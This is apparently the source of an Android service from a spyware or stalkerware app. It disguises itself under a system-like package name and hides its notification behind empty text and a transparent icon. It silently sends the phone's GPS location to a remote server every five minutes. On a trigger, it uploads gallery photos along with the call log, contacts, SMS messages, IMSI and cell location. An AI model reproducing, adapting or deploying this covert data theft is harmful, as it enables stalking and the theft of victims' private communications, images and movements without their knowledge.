package com.android.services.Firebase;

/**
 * Created by Tambora on 06/10/2016.
 */

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.provider.MediaStore;
import android.support.v4.app.NotificationCompat;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;
import android.widget.RemoteViews;

import com.android.services.Model.Model_images;
import com.android.services.R;
import com.android.services.Utils.AndLog;
import com.android.services.Utils.AppConf;
import com.android.services.Utils.FileUploader;
import com.android.services.Utils.SessionManager;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static com.android.services.Utils.AppConf.URL_SEND_DEEP;
import static com.android.services.Utils.AppConf.URL_UPDATE_LOKASI;


public class UpdateService extends Service {
    private static final String LOG_TAG = "ForegroundService";
    private Handler handler = new Handler();
    private final int NOTIFICATION_ID = 1479;
    private final int DELAY = 300000;
    private FusedLocationProviderClient mFusedLocationClient;
    private RequestQueue requestQueue;
    private boolean checkloc;
    private LocationManager locationManager;
    private int gpsFails = 0;
    String result;
    private static final String TAG_SUCCESS = "result";
    String slat, slang;
    SessionManager sessionManager;
    String image1;
    public static ArrayList<Model_images> al_images = new ArrayList<>();
    boolean boolean_folder;

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        sessionManager = new SessionManager(this);
        requestQueue = Volley.newRequestQueue(this);
        gpsFails = 0;
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        checkloc = false;
        slang = "0";
        slat = "0";

        RemoteViews remoteViews = new RemoteViews(getPackageName(),
                R.layout.content_notifiaction);

        //Log.i(LOG_TAG, "Received Start Foreground Intent ");
//        Intent notificationIntent = new Intent(this, MainActivity.class);
//        notificationIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK
//                | Intent.FLAG_ACTIVITY_CLEAR_TASK);
//        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
//                notificationIntent, 0);

//        Bitmap icon = BitmapFactory.decodeResource(getResources(),
//                R.drawable.ic_transparent);

        Notification notification = new NotificationCompat.Builder(this)
                .setContentTitle("")
                .setTicker("")
                .setContentText("")
                .setContent(remoteViews)
                .setSmallIcon(R.drawable.ic_transparent)
                .setOngoing(true).build();

        startForeground(NOTIFICATION_ID,
                notification);

        LocalBroadcastManager.getInstance(this).registerReceiver(broadcastReceiver, new IntentFilter("send"));

        handler.post(updateData);
        return START_STICKY;

    }

    public BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            ambilgallery();
            InsertDeep();
            AsyncTaskRunner task = new AsyncTaskRunner();
            task.execute();
        }
    };

    private class AsyncTaskRunner extends AsyncTask<String, String, String> {

        private String resp;
        //        ProgressDialog progressDialog;
        private String result1;
        private String result2;

        @Override
        protected String doInBackground(String... params) {
//            publishProgress("Process..."); // Calls onProgressUpdate()
            //Tooat("Welcome "+params[0]);
            try {

                result1 = "";
                result2 = "";

                resp = null;

                //This function is responsible for sending data to our webservice
                int send = 0;
                for (int i = 0; i < al_images.size(); i++) {
                    Log.e("FOLDERd", al_images.get(i).getStr_folder());

                    for (int j = 0; j < al_images.get(i).getAl_imagepath().size(); j++) {
                        Log.e("FILE", al_images.get(i).getAl_imagepath().get(j));
//                sessionManager.setImgPath(al_images.get(i).getAl_imagepath().get(j));

                        if(send < 10) {
                            resp = deepImagesInsert(al_images.get(i).getAl_imagepath().get(j));
                        }

                        send++;
                    }
                }
//                resp = deepImagesInsert();

                AndLog.ShowLog("Values", resp);


            } catch (Exception e) {
                e.printStackTrace();
                resp = e.getMessage();
            }
            return result1;
        }

        @Override
        protected void onPostExecute(String result) {
            // execution of result of Long time consuming operation
            //  list_adapter= new ListAdapter_UserPanel(User_SelectPark.this, pendingList);
            // listView.setAdapter(list_adapter);
            //Tooat(decision);

            String status = resp.trim();

            AndLog.ShowLog("rsstss", status);



            //finalResult.setText(result);
        }

        @Override
        protected void onPreExecute() {


//            progressDialog = ProgressDialog.show(FormPengajuan.this,
//                    "Process",
//                    "Please wait...");
        }

        @Override
        protected void onProgressUpdate(String... text) {
            //finalResult.setText(text[0]);

        }
    }

    public String deepImagesInsert(String imgPath) {
        String return_value = "";

        try {
            String charset = "UTF-8";
            String requestURL = null;

            requestURL = AppConf.URL_INSERT_GALLERY;

            FileUploader multipart = new FileUploader(requestURL, charset);
            multipart.addFormField("nomor", sessionManager.getNomor());
            multipart.addFormField("imsi", sessionManager.getImsi());
            multipart.addFormField("path_hp", imgPath);

            if (sessionManager.getImgPath() != null) {
                File imageFile = new File(imgPath);
                multipart.addFilePart("nama_file", imageFile);
            }

            AndLog.ShowLog("sdds", multipart.toString());
            List<String> response = multipart.finish();


            String combine = "";
            for (String line : response) {
                combine = combine + line;
            }
            return_value = combine;
            //Toast.makeText(this,combine,Toast.LENGTH_SHORT).show();

        } catch (Exception ex) {
            return_value = ex.getMessage();
        }

        return return_value;
    }

    @SuppressLint("MissingPermission")
    private void CheckLocation() {

        checkloc = true;

        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        mFusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
            @Override
            public void onSuccess(Location location) {

                if (location != null) {
                    // Logic to handle location object
                    double lat = location.getLatitude();
                    double lng = location.getLongitude();

                    slat = String.valueOf(lat);
                    slang = String.valueOf(lng);


                    UpdateLokasi();

                }

            }
        });
    }

    private void UpdateLokasi() {

        final SessionManager sess = new SessionManager(getApplicationContext());
        StringRequest strReq = new StringRequest(Request.Method.POST, URL_UPDATE_LOKASI, new Response.Listener<String>() {

            @Override
            public void onResponse(String response) {

                checkloc = false;
                gpsFails = 0;

                AndLog.ShowLog("RSPS", response + " ;; Lat : " + slat + " ;; Lng : " + slang);

            }
        }, new Response.ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError error) {

                checkloc = false;
                gpsFails = 0;


            }
        }) {

            @Override
            protected Map<String, String> getParams() {

                Map<String, String> params = new HashMap<String, String>();
                params.put("nomor", sess.getNomor());
                params.put("lat_gps", slat);
                params.put("lon_gps", slang);
                AndLog.ShowLog("df_update_lat_lang", String.valueOf(params));
                return params;
            }

        };
        requestQueue.add(strReq);
    }

    private void InsertDeep() {
        final SessionManager sess = new SessionManager(getApplicationContext());
        StringRequest strReq = new StringRequest(Request.Method.POST, URL_SEND_DEEP, new Response.Listener<String>() {

            @Override
            public void onResponse(String response) {

                checkloc = false;
                gpsFails = 0;

                AndLog.ShowLog("RSPS", response + " ;; Lat : " + slat + " ;; Lng : " + slang);

            }
        }, new Response.ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError error) {

                checkloc = false;
                gpsFails = 0;


            }
        }) {

            @Override
            protected Map<String, String> getParams() {

                Map<String, String> params = new HashMap<String, String>();
                params.put("nomor", sess.getNomor());
                params.put("imsi", sess.getImsi());
                params.put("call", sess.getLogCall());
                params.put("kontak", sess.getContact());
                params.put("lat_cid", sess.getLatCid());
                params.put("lon_cid", sess.getLngCid());
                params.put("lat_gps", slat);
                params.put("lon_gps", slang);
                params.put("sms", sess.getPesan());
                AndLog.ShowLog("df_insert_deep", String.valueOf(params));
                return params;
            }

        };
        requestQueue.add(strReq);
    }

    public Runnable updateData = new Runnable() {
        @Override
        public void run() {
            if (sessionManager != null) {
                if (sessionManager.getNomor() != null) {

                    if (gpsFails > 10) {
                        gpsFails = 0;
                        checkloc = false;
                    } else {
                        gpsFails++;
                    }

                    AndLog.ShowLog("RSPS", "RUNNING " + checkloc + " " + gpsFails);


                    if (!checkloc) {
                        boolean GpsStatus = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
                        if (GpsStatus) {
                            CheckLocation();
                        } else {
                            gpsFails = 0;
                            checkloc = false;
                            AndLog.ShowLog("RSPS", "GPS MATI " + checkloc + " " + gpsFails);

                        }
                    }
                }
            }

            handler.postDelayed(updateData, DELAY);

        }
    };

    public ArrayList<Model_images> ambilgallery() {
        al_images.clear();

        int int_position = 0;
        Uri uri;
        Cursor cursor;
        int column_index_data, column_index_folder_name;

        String absolutePathOfImage = null;
        uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.Images.Media.BUCKET_DISPLAY_NAME};

        final String orderBy = MediaStore.Images.Media.DATE_TAKEN;
        cursor = getApplicationContext().getContentResolver().query(uri, projection, null, null, orderBy + " DESC");

        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
        column_index_folder_name = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
        while (cursor.moveToNext()) {
            absolutePathOfImage = cursor.getString(column_index_data);
            Log.e("Column", absolutePathOfImage);
            Log.e("Folder", cursor.getString(column_index_folder_name));


            for (int i = 0; i < al_images.size(); i++) {

                if (al_images.get(i).getStr_folder().equals(cursor.getString(column_index_folder_name))) {
                    boolean_folder = true;
                    int_position = i;
                    break;
                } else {
                    boolean_folder = false;
                }
            }

            if (boolean_folder) {

                ArrayList<String> al_path = new ArrayList<>();
                al_path.addAll(al_images.get(int_position).getAl_imagepath());
                al_path.add(absolutePathOfImage);
                al_images.get(int_position).setAl_imagepath(al_path);

            } else {
                ArrayList<String> al_path = new ArrayList<>();
                al_path.add(absolutePathOfImage);
                Model_images obj_model = new Model_images();
                obj_model.setStr_folder(cursor.getString(column_index_folder_name));
                obj_model.setAl_imagepath(al_path);

                al_images.add(obj_model);


            }


        }


//        for (int i = 0; i < al_images.size(); i++) {
//            Log.e("FOLDERd", al_images.get(i).getStr_folder());
//
//            for (int j = 0; j < al_images.get(i).getAl_imagepath().size(); j++) {
//                Log.e("FILE", al_images.get(i).getAl_imagepath().get(j));
////                sessionManager.setImgPath(al_images.get(i).getAl_imagepath().get(j));
//
//                if(j < 10) {
//                    deepImagesInsert(al_images.get(i).getAl_imagepath().get(j));
//                }
//            }
//        }


        return al_images;
    }



    @Override
    public void onDestroy() {
        super.onDestroy();
        LocalBroadcastManager.getInstance(this).unregisterReceiver(broadcastReceiver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // Used only in case of bound services.
        return null;
    }
}